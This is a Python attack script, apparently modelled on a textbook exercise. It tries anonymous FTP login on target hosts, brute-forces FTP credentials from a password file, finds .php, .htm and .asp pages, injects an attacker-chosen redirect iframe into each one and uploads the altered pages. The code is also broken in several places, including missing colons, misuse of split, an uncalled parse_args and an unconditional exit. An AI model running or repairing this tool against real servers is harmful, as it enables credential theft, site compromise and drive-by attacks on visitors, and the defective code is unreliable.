import ftplib
import optparse
import time

def anon_login(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'rawr@uwo.ca')
		print('\n[*] '+str(hostname)+' FTP anonymous login succeeded')
		ftp.quit()
		return True
	
	except Exception as e:
		print('\n[-] '+ str(hostname)+' FTP Anonymous login failed.')
		return False



def brute_login(hostname, pass_file):
	pF = open(pass_file, 'r')
	
	for line in pF.readlines():
		user_name = line.split(':')
		password  = line.split(':').split('\r').split('\n')
		
		print('[*] Trying: ' + user_name + ':' + password)

		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(user_name, password)
			print('\n[*] '+ str(hostname) + ' FTP login succeeded: ' + user_name+":"+password)
			ftp.quit()
			return (user_name, password)
		except Exception as e:
			pass

		print("\n[-] Could not brute force FTP credentials.")
		return (None, None)



def return_default(ftp):
	try:
		dir_list = ftp.nlst() # returns an array 
	except:
		dir_list = []
		print('[-] Could not list directory contents.')
		print('[-] Skipping to next target')
		return
	
	ret_list = []

	for file_name in dir_list:
		fn = file_name.lower() # make it lower case so we have less checks to do 
		
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print('[+] Found default page: '+ file_name)

			ret_list.append(file_name)

	return ret_list 
		


def inject_page(ftp, page, redirect):

	local_file = open(page + '.tmp', 'w')
	ftp.retrlines('RETR '+page, local_file.write)

	print('[+] Downloaded Page: '+page)

	local_file.write(redirect)
	local_file.close()

	print('[+] Injected iframe on:' + page)
	
	ftp.storlines('STOR '+page, open(page+'.tmp', 'r')) 
	print('[+] Uploaded Injected page: '+ page)




def attack(username, password, tgt_host, redirect):

	ftp = ftplib.FTP(tgt_host)
	ftp.login(username, password)

	default_pages = return_default(ftp)

	for page in default_pages:
		inject_page(ftp, page, redirect)



def main():
	parser = optparse.OptionParser('usage%prog '+' -H <target host[s]> -r <redirect page>' + '[-f <userpass file>]')
	parser.add_option('-H', dest='tgtHosts', type='string', help ='specify target host')
	parser.add_option('-f', dest='passwdFile', type='string', help='specify user:password file')
	parser.add_option('-r', dest='redirect', type='string', help='specify redirection page')

	(options, args) = parser.parse_args

	tgtHosts = str(options.tgtHosts).split(', ')
	passwdFile = options.passwdFile

	redirect = options.redirect

	if tgtHosts == None or redirect == None:
		print(parser.usage)

	exit(0)

	for tgtHost in tgtHosts:
		username = None
		password = None

		if anon_login(tgtHost) == True
			username = 'anonymous'
			password = 'rawr@uwo.ca'

			print('[+] Using Anonymous credentials to attack..')

			attack(username, password, tgtHost, redirect)

		elif passwdFile != None:
			(username, password) = brute_login(tgtHost, passwdFile)

		
		if password != None
			print('[+] Using credentials: ' + username + ':' + password + ' to attack')

			attack(username, password , tgtHost, redirect)








if __name__=="__main__":
	main()
































	






	 			
	


















